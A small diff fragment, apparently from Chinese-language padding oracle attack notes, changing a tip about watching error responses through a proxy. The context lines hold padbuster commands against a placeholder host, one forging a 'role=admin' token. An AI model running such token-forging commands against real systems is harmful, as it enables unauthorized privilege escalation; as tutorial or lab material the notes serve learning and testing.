@@ -32,4 +32,4 @@ padbuster http://example.local/profile.php?token=TOKEN TOKEN 16 -prefix "user="
 padbuster http://example.local/profile.php?token=TOKEN TOKEN 16 -plaintext "role=admin"
 ```
 
-小记录：padding oracle 要靠稳定错误差异判断。先用代理观察响应码、长度和错误文本，再让工具跑，结果更可靠。
+padding oracle 要靠稳定错误差异判断。先用代理观察响应码、长度和错误文本，再让工具跑，结果更可靠。
